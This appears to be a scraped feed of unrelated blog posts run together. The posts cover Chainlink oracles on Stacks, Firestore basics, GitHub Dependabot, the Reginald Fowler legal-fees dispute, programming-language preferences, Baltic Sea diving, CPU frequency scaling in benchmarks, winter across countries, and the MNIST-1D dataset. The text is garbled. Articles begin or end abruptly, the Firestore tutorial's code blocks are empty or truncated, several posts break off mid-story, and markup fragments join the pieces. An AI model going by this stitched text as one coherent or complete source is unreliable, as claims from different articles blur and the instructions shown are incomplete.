<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Introduction</h2><p>In September, it was announced that <a href="https://chain.link/" target="_blank" rel="noopener noreferrer">Chainlink</a> will come to the Stacks ecosystem. Chainlink is described as decentralized oracle network that provides reliable, tamper-proof inputs and outputs for smart contracts on any blockchain. From the view point of a smart contract developer this is just an interface (aka trait in Clarity) for a black box that can be asked a question and it will return an answer. This introduces a level of trust that lies outside of the blockchain. </p><p>The on-chain trust of a blockchain is built by the consensus algorithm. It gives trust in the state of the blockchain because the majority of the nodes verifies all state changes based on data that is stored on chain. Chainlink tries to build a trust system by self-certification and data duplication. There is an incentive for oracles to provide correct data through rewards (in LINK tokens). However, there is no explicit stake at risk for oracles if they provide incorrect data.</p><p><img src="https://gaia.blockstack.org/hub/1Af6tr97gdEF24Ds2Mat3no6P6EkcGxUkL/photos/7OpWl12AEvTSa-C12Zatn/I9gyPQhFu6H1_7cam1w13-8c35025-Request__Receive_Data.png"></p><h2>Proof-of-Stake Mixin</h2><p>The Stacks blockchain has a reliable link to the Bitcoin blockchain through Proof of Transfer. This link can be used for oracles for the bitcoin blockchain. Bitcoin oracles can answer questions like how many confirmations has a Bitcoin transaction or what is the current balance of a bitcoin address. Looking at the stacks node, these questions could be answered easily by all stacks nodes because they have already access to the Bitcoin blockchain. </p><p>A stacks node could watch out for transactions of a Bitcoin oracle question, then check the Bitcoin blockchain and send a transaction with the answer. What is more, miner nodes could do the same and include only transactions if they found the same answer. Probably, it would be the other way around: Miner nodes would send the answering transaction themselves to get the reward and all stack nodes could verify it. If they find out that the miner added a transaction with a wrong answer they could deny the miner's block reward. The blockchain would then continue with a fork containing the "correct" transaction. This means that the block reward acts as the stake for the Bitcoin oracles.</p><p><img src="https://gaia.blockstack.org/hub/1Af6tr97gdEF24Ds2Mat3no6P6EkcGxUkL/photos/7OpWl12AEvTSa-C12Zatn/FhPRhRqbx75Aq80Ds_cRL-bitcoinoracles.png"></p><h2>Wrapped Bitcoin</h2><p>With Bitcoin oracles it is easier to build wrapped Bitcoins. Wrapped Bitcoins are fungible tokens on the Stacks blockchain that correspond to Bitcoins on the Bitcoin blockchain. There is one Wrapped Bitcoins contract that creates new tokens whenever its corresponding Bitcoin address received Bitcoins. The tokens are sent to the corresponding Stacks address of the Bitcoin sender. Bitcoin oracles can be asked to confirm that the Wrapped Bitcoins are indeed backed by real Bitcoins. </p><p><img src="https://gaia.blockstack.org/hub/1Af6tr97gdEF24Ds2Mat3no6P6EkcGxUkL/photos/7OpWl12AEvTSa-C12Zatn/aJXhlBiAY3SHyI2itediE-Wrapped%20Bitcoin.png"></p><h2>Conclusion</h2><p>With the trust in Bitcoin oracles that are secured by additional Proof-of-Stake, a new class of smart contracts can be built: Smart contracts could payout Stacks loans based on Bitcoin collaterals, Bitcoin transactions could be counted as votes on the Stacks blockchain and so on.</p></div></div>]]>

<![CDATA[Introduction to Google Firestore]]>

December 2, 2020 | https://ncona.com/2020/12/introduction-to-google-firestore/ | <a href="https://web.archive.org/web/*/https://ncona.com/2020/12/introduction-to-google-firestore/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Firestore is Google’s serverless document database offering.</p>

<h2 id="what-does-serverless-mean">What does serverless mean?</h2>

<p>Serverless means that we don’t have to worry about managing the servers on which the database runs. All the management is done automatically by Google. The database will scale up or down depending on the demand.</p>

<h2 id="whats-a-document-database">What’s a document database?</h2>

<p>A document database is a non-relational database that stores data in a semi-structured format. A common format used by many document databases is JSON.</p>

<p>In a relational database, we usually create tables with a defined structure (columns and types). In a document database, it’s not necessary to specify the different columns.</p>

<!--more-->

<h2 id="concepts">Concepts</h2>

<p>There are two concepts we need to be familiar with to model our Firestore database: <code>documents</code> and <code>collections</code>.</p>

<p>A <code>document</code> is similar to a JSON object. Each top level attribute is called a <code>field</code>. A document can’t be bigger than 1MB.</p>

<p>A <code>collection</code> is a group of documents. We can think of it as a table without a schema, just a name.</p>

<p>A <code>document</code> can point to a <code>collection</code>, and <code>documents</code> in that <code>collection</code> can point to other <code>collections</code>.</p>

<h2 id="creating-a-database">Creating a database</h2>

<p>When we talk about creating a database, we are referring to making it possible to create <code>collections</code> and <code>documents</code> in Google Cloud. At the time of this writing, Firestore databases come in 2 flavors:</p>

<ul>
  <li><code>Native mode</code> - Recommended for mobile apps or browsers</li>
  <li><code>Datastore mode</code> - Recommended for back-end servers</li>
</ul>

<p>Currently there is no way to create a database in <code>datastore mode</code> using <code>gcloud</code> cli, so we need to do it from the cloud console. If we want to create a database in native mode we can use:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>gcloud firestore databases create
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This command triggers some initial setup that might take a few minutes.</p>

<p>Once we choose the mode for a Google Cloud project, it can’t be changed. If we want to change it, we would need to create a new project and create another database there.</p>

<h2 id="writing-data">Writing data</h2>

<p>In relational databases we need to define our tables and schemas in advance. That’s not the case on Firebase. Documents are created in collections. If a collection doesn’t exist, it will be created on the fly.</p>

<p>Clients exist for various programming languages. We’re going to use Golang in this article.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2

4
</pre></td><td><pre><span>mkdir</span> ~/project
<span>cd</span> ~/project
go mod init ncona.com/firestore
<span>touch </span>main.go
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Let’s write some data (<code>main.go</code>):</p>

<p>Note that <code>GcpCredentialsFile</code> must be a valid service account key with permissions for Firestore (roles/datastore.user), and <code>ProjectId</code> should be the id of the project where the database lives.</p>

<p>We can run our program with:</p>



<p>The <code>Set</code> operation creates a new record or replaces an existing one. The <code>Doc("1")</code> part of the command tells firestore to use <code>1</code> as a document identifier. There can’t be two documents with the same identifier in a collection.</p>

<p>It’s also possible to tell firestore to <code>merge</code> an existing document instead of replacing it:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1

<p>Each document we write is represented by a path. For the document we just created, this will be the path:</p>

<h2 id="indexes">Indexes</h2>

<p>A very brief note about indexes, because they work differently than in other databases. There are two types of indexes in firestore, <code>single-field indexes</code> and <code>composite indexes</code>.</p>

<p>As the name suggests, <code>single-field indexes</code> are indexes made of a single field. Firestore automatically creates <code>single-field indexes</code> for all the fields in a document, so we don’t have to worry about creating these ourselves.</p>

<p>As opposed to <code>single-field indexes</code>, <code>composite indexes</code> are not created automatically. These are indexes formed by more than one field and need to be defined before they can be used.</p>



<p>This article scratched the surface of what can be done with <code>Firestore</code>. There are many things about querying that I didn’t cover, as well as other interesting topics like transactions and arrays. I’m planning on using it in a project, so hopefully I’ll be writing about these topics in the future.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Integrating security as a part of application development is desirable, but it's often forgotten or dismissed in practice. Dependabot is a Github feature that will help you keep all your dependencies invulnerable and up-to-date, and you can enable it in just a few clicks!</p>
</section><article><section><p>I've often been told that integrating security as a role and shared responsibility in application development is important. Yet, in my experience, security is frequently given a low priority by developers. Progress is primarily estimated by looking at an application's new features, and security measures are considered invasive and complicating to our day-to-day-work. Luckily, there are tools that requires little effort to increase our focus on security, such as Github's Dependabot  </p>
<h2>What is Dependabot?</h2>
<p>Simply put, Dependabot is a tool designated to keep dependencies secure and up-to-date. How it works can be summarized in the following three steps:</p>
<ol>
<li>Dependabot scans your dependency files for outdated or insecure dependencies.</li>
<li>Dependabot creates pull requests for dependencies that need an update.</li>
<li>You review, test and merge Dependabot’s changes.</li>
</ol>
<p>Following Github's acquisition of Dependabot in May 2019, the feature was added natively to Github. With only a few clicks, Dependabot can easily be enabled from the Github dashboard, and help you keep your application’s dependencies up-to-date.</p>
<h2>Getting started</h2>
<p>Enough background information, let us talk about how to get started. Github's security settings can be configured for an <a href="https://docs.github.com/en/free-pro-team@latest/github/setting-up-and-managing-organizations-and-teams/managing-security-and-analysis-settings-for-your-organization">entire organization</a>, applying to all of the organization’s repositories, or it can be configured <a href="https://docs.github.com/en/free-pro-team@latest/github/administering-a-repository/managing-security-and-analysis-settings-for-your-repository">per repository</a>. Which is the better option depends on your context. If you are the owner of your organization and it is desirable to enable the security features across all of its repositories, obviously it would be less time consuming to configure this on the organization level, rather than for each repository individually. However, if you are a part of a large organization with lots of teams and projects, enabling Dependabot on the repository level might be the only option.</p>
<p>In this example, we will enable Dependabot on a single repository. In your repository, there should be a button titled “Security”. Note that the security option is only visible to administrators, hence it will not be visible if you don't have the admin role in the repository. </p>
<p><img src="https://i.ibb.co/kScW0pN/screenshot-2020-11-21-at-18-06-01-1.png" alt="To enable Dependabot, click on the &quot;Security&quot; button."></p>
<p>In the security overview, there is a row titled “Dependabot alerts”. If not already activated, there should be a button to “Enable Dependabot alerts”. Click it. You should now have three options that you can enable:</p>
<ul>
<li>Dependency graph</li>
<li>Dependabot alerts</li>
<li>Dependabot security updates</li>
</ul>
<h3>Dependency graph</h3>
<p>The dependency graph is a summary of the manifest and lock files stored in a repository. Enabling this feature is a prerequisite for the other options, as Dependabot requires access to the dependency graph in order to create alerts and updates.</p>
<h3>Dependabot alerts</h3>
<p>The alerts allows Dependabot to notify you when it finds a weakness. This is probably the key feature that you are here for. When activated, the number of unresolved alerts is highlighted in the "Security" button that we previously clicked. On the security tab, the alerts highlighting currently outdated dependencies are listed. By clicking on an alert, you will find more details on it, such as a description of the vulnerability and in what version of the dependency it was patched.</p>
<p><img src="https://i.ibb.co/VMrM5Kh/screenshot-2020-11-16-at-19-59-16.png" alt="Security: Dependabot alerts" title="Unresolved Dependabot alerts are listed in the repository."></p>
<h3>Dependabot security updates</h3>
<p>By enabling the third option, the security updates, whenever a vulnerable dependency is discovered, Dependabot will try to fix it. If it is possible to upgrade the vulnerable dependency without disrupting the dependency graph of the repository, Dependabot will generate a pull request bringing the dependency up-to-date. The pull request is given a compatibility score indicating whether the update could cause breaking changes. The number is based on the percentage of tests in public repositories that passed when performing the same update.</p>
<p><img src="https://i.ibb.co/2vr3GBb/dependabot-pull-request.png" alt="Example pull request generated by Dependabot" title="A pull request generated by Dependabot"></p>
<p>Unfortunately, in my experience working with Dependabot, more often than not, it is unable to generate pull requests. This is often because the source of the vulnerability is an indirect or transitive dependency. The Dependabot documentation states that <em>“(...) security updates are triggered only for dependencies that are specified in a manifest or lock file. Dependabot is unable to update an indirect or transitive dependency that is not explicitly defined.”.</em> This means that even though Dependabot is able to perform some automatic updates, you should expect to perform most of the updates yourself - for now.</p>
<p>Even though Dependabot is unable to perform automated dependency updates most of the time, I would recommend enabling the feature. Occasionally it <em>will</em> be able to create the pull request for you, and you'll have saved yourself a couple of minutes that you can spend on something else.</p>
<p><img src="https://i.ibb.co/xXLhGLr/dependabot-pr-error.png" alt="Error message: Dependabot cannot update to the required version" title="More often than not, Dependabot is unable to generate a pull request"></p>
<p>If you already have established an effective process to update your project's dependencies, Dependabot might not be able to help you. Otherwise, you should definitely give it a try. It's free, it takes minimal effort to set up and - no matter how you use it - it's a better option than not monitoring your dependencies in any way.</p></section></article></div>]]>

<p>Fowler’s lawyers <a href="https://amycastor.com/2020/11/12/reginald-fowlers-lawyers-want-to-quit-did-he-neglect-to-pay-them/">want to drop out of the case</a> due to nonpayment, but they need to get permission from the court first.&nbsp;</p>



<p><a href="https://amycastor.com/2020/11/24/reggie-fowler-hoodwinks-his-own-defense-team/">Last we left off</a>, U.S. District Judge Andrew Carter ordered attorneys at law firm Hogan Lovells—also representing defense lawyer Scott Rosenblum at Rosenblum Schwartz &amp; Fry—to file three versions of a sealed letter dated Nov. 18.</p>



<p>The public version—redacting what should not be revealed to the government or the public—discloses more details on the lawyers’ frustrations with a client who perpetually strings them along.&nbsp;</p>



<p>Hogan Lovells attorneys James McGovern and Michael Hefter initially asked for a $25,000 retainer in late 2018 when they first met with their client. Fowler only ever paid the retainer, and two years later, he now owes them $600,000.</p>



<p>His defense team believed all the stories he told them that he was swimming in money, so they weren’t too concerned—at first.</p>



<p>“From the very inception of this matter, we have been led to believe that Mr. Fowler is a high net worth individual with substantial assets, which would allow him to pay his legal bills with little hardship,” the lawyers said in their letter to the judge. </p>



<p>Hogan Lovells started working with Fowler on October 18, 2018. They had their first meeting with him on Nov. 8, 2018, around the time Fowler was initially contacted by the FBI. </p>



<p>“When we agreed to represent Mr. Fowler, it was our understanding that he had been targeted by cryptocurrency businessmen seeking to take advantage of Mr. Fowler’s personal balance sheet as a means of transacting cryptocurrency transactions without drawing the attention of bank compliance officers or regulators,” they said. </p>



<p>Fowler was later arrested in Chandler, Arizona, on<a href="https://www.justice.gov/usao-sdny/pr/arizona-man-and-israeli-woman-charged-connection-providing-shadow-banking-services"> </a>April 30, 2019. (<a href="https://www.justice.gov/usao-sdny/pr/arizona-man-and-israeli-woman-charged-connection-providing-shadow-banking-services">DoJ press release and indictment</a>.)</p>



<p>After his release in May <a href="https://amycastor.com/2019/05/11/reginald-fowler-man-at-center-of-cryptocurrency-scheme-out-on-5-million-bail/">on $5 million bail</a>, Fowler hired Scott Rosenblum to join the defense team. Rosenblum asked for a $275,000 retainer and an additional $85,000 per week retainer, if the case went to trial.&nbsp;Rosenblum received a partial retainer of $100,000, which Hogan Lovells notes that Fowler paid “while he had several unpaid, overdue invoices for legal services issued by Hogan Lovells.”&nbsp;</p>



<p>Additionally, Fowler paid another lawyer (unnamed) in Portugal in full for her services. He also paid international law firm Reed Smith LLP for&nbsp;services rendered in 2018.</p>



<p>“The fact that other attorneys had received payments from Mr. Fowler for their services led us reasonably to believe that Mr. Fowler’s representations to us that he would pay our bills was truthful,” the lawyers said.</p>



<p>In the second half of 2019, the lawyers were diligent about contacting Fowler for money. Each time they reached out, he told them payment was imminent and that “transactions or business deals that would fund the payment of our fees were in process”—but he never paid him.&nbsp;</p>



<p>In February, following a plea bargain that went awry and a superseding indictment, the defense team realized the case would likely go to trial, requiring a substantial amount of work, and still no check from their client. </p>



<p>Fowler has ample funds, they said, including “$10 million in real estate that is unencumbered and could have been liquidated or monetized at any point during the past two years.” His refusal to pay, the lawyers added, has “led to a breakdown in the attorney-client relationship.”</p>



<p>The government has till Dec. 8 to respond and replies are due Dec. 11.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main id="main-content"><article><div><section><p>This is an opinionated post. Consider yourself warned. You will probably disagree with at least some of it, and that is completely fine. The important part is the thought process – don’t just read through it and agree or disagree, think about <em>what</em> you agree or disagree with and <em>why</em>. Becoming aware of these things is valuable: once you become aware of why you dislike something, you can start doing something about it.</p>
</section><article><section><p>Over the years, I have noticed there is a small set of features I value more than others in programming languages. These features allow me to express myself in a concise and clear manner, makes my code more readable, and minimizes the amounts of errors I make. They are not "magical" in any way. Far from it. Rather, they are more.. fundamental aspects of the progamming language itself. Let’s dive in!</p>
<h2>Expressive type system</h2>
<p>Types help me reason. Explicitly typed code communicates intent better, and is easier to navigate without losing context completely. Type systems comes in a variety of flavors, ranging from the most simple ones to more advanced systems with gradual typing, dependent types, type classes, and so on. Although I personally prefer more advanced ones, I believe this is more of a subjective topic. And of less importance, really. The main benefit of type systems exists in even the simplest ones: increased safety and readability. Remember: the compiler is your friend – the more it can verify, the better!</p>
<h2>Type inference</h2>
<p>I was a bit unsure if this point had its place in this blog post. On one hand, I feel its more of a convenience feature than strictly neccessary. On the other, an overly chatty and boilerplaty type system can cause more harm than good –&nbsp;if your business logic drowns in types, it’s too far in the wrong direction. Java, around the 1.5 era, is an example of this. In addition, type inference itself is a a double-egded sword. If the compiler inferes a different type than what you would have thought, it can be quite hard to spot where the actual error is. This is the reason some languages and communities define best practices around type inference, like being explicit in function signatures. Anyway. When I find that perfect spot between explicit types and inferred types, it just makes me really happy.</p>
<h2>Algebraic data types</h2>
<p>I remember the first time I enountered sum types. My first response was «but.. Isn’t this just some kind of enums?». I can kind of see why I thought that, but I feel this is a limiting way of approaching them. Where enums helps me limit valid values, algebraic data types is so much more. It enables me to model my domain and state in a precise and correct manner, and makes illegal states «impossible». This didn’t really become clear to me until I went back to Java. I find modelling without them cumbersome and hard, and sometimes even end up in situations where I can’t avoid impossible states. Few things are more confusing than finding the comment «this can’t happen» in a branch of someones code.</p>
<h2>First class functions</h2>
<p>I don’t even understand why this is subject to discussion anymore, but functions should be treated just like any other value <sup id="fnref-1"><a href="#fn-1">1</a></sup> in a programming language. Returning functions and accepting functions as parameters is a fundamental feature to create abstractions and solve problems with composition. This just isn’t up for debate – I would take first class functions over any other feature any day of the week!</p>
<p><sup id="fnref-1"><a href="#fn-1">1</a></sup> – I use the term "value" loosely here. I don’t mean to debate value types, reference types, and pass by value or reference. Those are implementation details. The point is to see what advantages you get when a language treats simple values and functions the same. </p>
<h2>Functional Programming</h2>
<p>Functional programming taught me to value these features. Sure, you will find imperative languages with these features as well, but they never feel like a core feature of the language. Even Java comes with some sort of primitive type inference these days, but it mostly feels tacked onto the language.</p>
<p>With some notable exceptions (looking at you, LISP), these are core features in all functional programming languages I use. They make my day better, so I would think hard before adopting a language without them these days.</p>
<p>Which feature do you miss or disagree with the most?</p></section></article></div></article></main></div></div>]]>

<p>
As an archaeologist, Florian Huber is in the truest sense of the word with all waters. He searched for ancient Mayan antiquities in the flooded caves of the Yucatán, and dived to the bottom of fjords and deep alpine lakes. Again and again, however, the Kiel underwater researcher was drawn to the bottom of the Baltic Sea, where he tracked down wrecks or examined flora and fauna together with biologists.
</p>
<p>
It was here, of all places, that the well-traveled researcher made his most exciting discovery. Huber was actually working with two colleagues in the Geltinger Bucht, not far from Flensburg, in the service of environmental protection. The divers looked for ghost nets, abandoned fishing nets that become deadly traps for marine animals at the bottom.
</p>
<p>
From on board the “Mola Mola”, a nearly eight-meter-long motor catamaran, the researchers systematically scanned the sea floor with sonar. If the system detects a disused network or another object on the ground, the tracking device receives conspicuous sound pulses. The divers then slip into their suits, strap on their compressed air cylinders and drop backwards from the ship’s railing into the cold water to check.

  <div>
    <p>I’ve been spending an unreasonable amount of time trying to understanding performance jitters in a C++ application I’m working on. I have been measuring the time taken to execute a physics update as part of a graphics loop, something like:</p>
<div><pre><code data-lang="cpp"><span>void</span> <span>update</span><span>()</span> <span>{</span>
    <span>// Need to analyze performance of this function:
</span><span></span>    <span>step_physics</span><span>();</span>

    <span>// Regular OpenGL drawing stuff, glBuffer etc
</span><span></span>    <span>draw</span><span>();</span>
<span>}</span>
</code></pre></div>
<p>I’m interested in optimizing the physics step, so I instrument it using <a href="https://en.cppreference.com/w/cpp/chrono"><code>std::chrono</code></a>:</p>
<div><pre><code data-lang="cpp"><span>void</span> <span>update</span><span>()</span> <span>{</span>
    <span>using</span> <span>namespace</span> <span>std</span><span>::</span><span>chrono</span><span>;</span>

    <span>auto</span> <span>start</span> <span>=</span> <span>high_resolution_clock</span><span>::</span><span>now</span><span>();</span>
    <span>step_physics</span><span>();</span>
    <span>duration</span><span>&lt;</span><span>double</span><span>&gt;</span> <span>elapsed</span> <span>=</span> <span>high_resolution_clock</span><span>::</span><span>now</span><span>()</span> <span>-</span> <span>start</span><span>;</span>
    <span>double</span> <span>physics_time</span> <span>=</span> <span>elapsed</span><span>.</span><span>count</span><span>();</span>

    <span>// Regular OpenGL drawing stuff, glBuffer etc
</span><span></span>    <span>draw</span><span>();</span>
<span>}</span>
</code></pre></div>
<p>Here’s what time taken looks like:</p>

        <img src="https://karthikkaranth.me/img/blog/performance-benchmarking-beware-frequency-scaling/time_jitter.png">
    
    
</figure>

<p>That’s a terrifying amount of jitter! Many dead ends and experiments later, I noticed that the performance stabilized when I started <em>drawing more things</em> to understand the problem. Turns out, the jitters were a result of <em>not doing enough work</em> in the draw call!</p>

<p>Operating systems typically employ some form of <a href="https://wiki.archlinux.org/index.php/CPU_frequency_scaling">CPU frequency scaling</a> to save power when the system isn’t doing much work. The default governor on my system would keep the CPU at a low-power low-frequency mode, and dynamically increase it when the system load increases.</p>

<p>My application ran at 60FPS(about 16.67ms per frame). Since the update took much less than that overall, the process would sleep till the next frame. The default CPU governor <a href="https://wiki.archlinux.org/index.php/CPU_frequency_scaling#Scaling_governors">powersave</a> would keep the CPU at a lower frequency because it sees the process mostly sleeping! During the update function however, the frequency would be scaled. This caused massive fluctuations in the recorded benchmarks!</p>

<p>Also, I should note that this was a symptom of improper benchmarking: I knew that the performance was stable if I simply ran the physics updates and didn’t draw anything. :( This entire ordeal was an attempt to understand why drawing would cause such massive differences in performance!</p>

<p>To verify this, I <a href="https://askubuntu.com/a/855744">switched the governor</a> to performance:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blog">
                    <h2>Different countries</h2>
<p>What do you think when someone says the season's name, Winter? What is the first association that comes to your mind?</p>
<p>Is it snowy mountains and puff jackets that make everyone look like a hulk? Is it the dirt that gets combined with the snow on the sides of the prospects? Is it a nice and hot season that signals the end of a raining season that has been not letting you live in peace?</p>
<p>Is it the Christmas decorations that get put out by business and by the city? Is it the family that you will be able to meet and spend Christmas together? Is it the new year and a fresh start to your goals?</p>
<p>To tell you the truth, this will be different to every individual.</p>
<h2>Russia</h2>
<p>I have been travelling around ever since I was young and I have talked and met both in-person and online many different representatives of different nations. One of the biggest patterns that I saw is that we, as a family, tried to escape Russia every single winter due to the coldness and grimness of people at that time of the year.</p>
<p><img alt="winter in Russia store" src="https://i.gyazo.com/0bb2b6a3d5dfa0453956dcadb24c2e57.jpg"></p>
<p>People in Russia usually associate winter with 3 things:</p>
<ul>
<li>Cold weather that doesn’t let you properly move about and enjoy yourself outside for more than 30 minutes.</li>
<li>New Year’s holidays that last at least 8 days and let everyone drink as much alcohol and catch up on as much sleep as they can. Oh and, by the way, everything an anything is closed.</li>
<li>Constant struggle between the government's ability to clean the roads off snow and the amount of snow that falls. (Usually, the snow starts winning at the start of the winter, but the tractors take back the advantage in January)</li>
</ul>
<p><img alt="winter in Russia Saint Petersburg" src="https://i.gyazo.com/920deaec69bf9478d15bb812127ffd9d.jpg"></p>
<p>All of this is very strongly embedded in the minds of every Russian. That is the definition of what Winter is, and it is also a signal that everyone needs to get ready for at least 6 months of temperature below 2 degree Celsius. It is not ideal, to say the least.</p>
<p>So when you leave Russia in December, after you got to experience that heavy mood, any other country that is not close to Russia is a new perspective on the winter season entirely.</p>
<h2>France</h2>
<p>Let’s take France as an example, especially Côte d'Azur. The weather here is never bellow 0 degrees, except on infrequent occasion. They haven’t had snowfall in the city for at least 10 years. It is always clean here with everyone starting to celebrate Christmas since November. You can also wear a t-shirt outside on some rare days when the sun is particularly active. Well, is that different from what Russians feel? Yes, yes, it is.</p>
<p><img alt="winter in France" src="https://i.gyazo.com/946973cd18e14ba48c2b4f99acbeb8cc.jpg"></p>
<p>So what about the locals? What is winter to them? Mainly it is a Christmas holiday and gathering as many friends and family as possible to catch up. </p>
<p>French people are a very talkative bunch when they ask you how are you; you are not just expected to answer quickly and get on with it, no. You are expected to ask them back and then dive deeper and ask how are their family and work. They talk—a lot.</p>
<p>I don’t mind it, but coronavirus had other plans for them this time. How do you gather every friend and colleague when you are on lockdown? Well, you can’t. So their holiday spirit must be broken right now, and it is felt all around us in the air.</p>
<h2>South Korea</h2>
<p>What about this magical place in Asia called South Korea?</p>
<p><img alt="South Korea during winter" src="https://i.gyazo.com/632b2aa2eb353a7c63311bd27638d148.jpg"></p>
<p>In reality, they don’t celebrate Christmas themselves religiously. They only do it like most of the western holidays. They get a cake, slice it around the close family table and go to sleep. Nothing fancy or special.</p>
<p>But the spirit of the holiday is everywhere at this time of the year. Everything is beautiful and decorated. Mostly for foreigners but also to show off that they know about western holidays as well.</p>
<p>What is their idea of Winter then? It depends… There is a strong Chinese part of the population that can’t wait to celebrate the Lunar year, but there are also others that don’t really care. Others just want winter to be finished as humidity rises, and the temperature drops to around 5 degree Celsius, which is basically the same thing as -20 in Russia.</p>
<p><img alt="winter in South Korean new year" src="https://i.gyazo.com/9ba59d5c9cd4063dbabdf3ff0010548d.jpg"></p>
<p>All in all, every country feels and shows Winter very differently.</p>
<p>Some celebrate it, some hate it and want it to be over. The way you perceive the Winter outside that is the way people in the country will feel for the whole season. So next time you talk to someone on how is the weather, don’t try to say how horrible it is. Look at the positive things, and maybe you can change your own perspective as well.</p>
<p>Be nice. Be the first person you know that is nice around you. You can start the domino effect and hopefully change the whole countries perspective. Wouldn’t be amazing to make so many people’s lives better?</p>
<p>Start now. Get perfect later.</p>

    <p>Constructing the MNIST-1D dataset. As with the original MNIST dataset, the task is to learn to classify the digits 0-9. Unlike the MNIST dataset, which consists of 28x28 images, each of these examples is a one-dimensional sequence of points. To generate an example, we begin with 10 digit templates and then randomly pad, translate, add noise, and transform them as shown above.</p>
  	</div>

<p>By any scientific standard, the Human Genome Project <a href="https://deepblue.lib.umich.edu/handle/2027.42/62798">was enormous</a>: it involved billions of dollars of funding, dozens of institutions, and over a decade of accelerated research. But that was only the tip of the iceberg. Long before the project began, scientists were hard at work assembling the intricate science of human genetics. And most of the time, they were not studying humans. The foundational discoveries in genetics centered on far simpler organisms such as peas, molds, fruit flies, and mice. To this day, biologists use these simpler organisms as genetic “minimal working examples” in order to save time, energy, and money. A well-designed experiment with Drosophilia, such as <a href="https://pubmed.ncbi.nlm.nih.gov/10746727/">Feany and Bender (2000)</a>, can teach us an astonishing amount about humans.</p>

<p>The deep learning analogue of Drosophilia is the MNIST dataset. A large number of deep learning innovations including <a href="https://jmlr.org/papers/v15/srivastava14a.html">dropout</a>, <a href="https://arxiv.org/abs/1412.6980">Adam</a>, <a href="http://yann.lecun.com/exdb/publis/pdf/lecun-89e.pdf">convolutional networks</a>, <a href="https://arxiv.org/abs/1406.2661">generative adversarial networks</a>, and <a href="https://arxiv.org/abs/1312.6114">variational autoencoders</a> began life as MNIST experiments. Once these innovations proved themselves on small-scale experiments, scientists found ways to scale them to larger and more impactful applications.</p>

<p>They key advantage of Drosophilia and MNIST is that they dramatically accelerate the iteration cycle of exploratory research. In the case of Drosophilia, the fly’s life cycle is just a few days long and its nutritional needs are negligible. This makes it much easier to work with than mammals, especially humans. In the case of MNIST, training a strong classifier takes a few dozen lines of code, less than a minute of walltime, and negligible amounts of electricity. This is a stark contrast to state-of-the-art vision, text, and game-playing models which can take months and <a href="https://arxiv.org/abs/2004.08900">hundreds of thousands of dollars</a> of electricity to train.</p>

<p>Yet in spite of its historical significance, MNIST has three notable shortcomings. First, it does a poor job of differentiating between linear, nonlinear, and translation-invariant models. For example, logistic, MLP, and CNN benchmarks obtain 94, 99+, and 99+% accuracy on it. This makes it hard to measure the contribution of a CNN’s spatial priors or to judge the relative effectiveness of different regularization schemes. Second, it is somewhat large for a toy dataset. Each input example is a 784-dimensional vector and thus it takes a non-trivial amount of computation to perform hyperparameter searches or debug a metalearning loop. Third, MNIST is hard to hack. The ideal toy dataset should be procedurally generated so that researchers can smoothly vary parameters such as background noise, translation, and resolution.</p>

<p>In order to address these shortcomings, we propose the MNIST-1D dataset. It is a minimalist, low-memory, and low-compute alternative to MNIST, designed for exploratory deep learning research where rapid iteration is a priority. Training examples are 20 times smaller but they are still better at measuring the difference between 1) linear and nonlinear classifiers and 2) models with and without spatial inductive biases (eg. translation invariance). The dataset is procedurally generated but still permits analogies to real-world digit classification.</p>

Like MNIST, the classifier's objective is to determine which digit is present in the input. Unlike MNIST, each example is a one-dimensional sequence of points. To generate an example, we begin with a digit template and then randomly pad, translate, and transform it.</p>

<h2 id="example-use-cases">Example Use Cases</h2>

<p>In this section we will explore several examples of how MNIST-1D can be used to study core “science of deep learning” phenomena.</p>

<p><strong>Finding lottery tickets.</strong> It is not unusual for deep learning models to have ten or even a hundred times more parameters than necessary. This overparameterization helps training but increases computational overhead. One solution is to progressively prune weights from a model during training so that the final network is just a fraction of its original size. Although this approach works, conventional wisdom holds that sparse networks do not train well from scratch. Recent work by <a href="https://arxiv.org/abs/1803.03635">Frankle &amp; Carbin (2019)</a> challenges this conventional wisdom. The authors report finding sparse subnetworks inside of larger networks that train to equivalent or even higher accuracies. These “lottery ticket” subnetworks can be found through a simple iterative procedure: train a network, prune the smallest weights, and then rewind the remaining weights to their original initializations and retrain.</p>

<p>Since the original paper was published, a multitude of works have sought to explain this phenomenon and then harness it on larger datasets and models. However, very few works have attempted to isolate a “minimal working example” of this effect so as to investigate it more carefully. The figure below shows that the MNIST-1D dataset not only makes this possible, but also enables us to elucidate, via carefully-controlled experiments, some of the reasons for a lottery ticket’s success. Unlike many follow-up experiments on the lottery ticket, this one took just two days of researcher time to produce. The curious reader can also <a href="https://bit.ly/3nCEIaL">reproduce these results</a> in their browser in a few minutes.</p>

  </p>
  <p>Finding and analyzing lottery tickets. In <b>a-b)</b>, we isolate a "minimum viable example" of the effect. Recent work by <a href="https://arxiv.org/abs/1906.02773">Morcos et al (2019)</a> shows that lottery tickets can transfer between datasets. We wanted to determine whether spatial inductive biases played a role. So we performed a series of experiments: in <b>c)</b> we plot the asymptotic performance of a 92% sparse ticket. In <b>d)</b> we reverse all the 1D signals in the dataset, effectively preserving spatial structure but changing the location of individual datapoints. This is analogous to flipping an image upside down. Under this ablation, the lottery ticket continues to win.</p>
</div>

  </p>
  <p><img src="https://greydanus.github.io/assets/scaling-down/lottery_b2.png">
  </p>
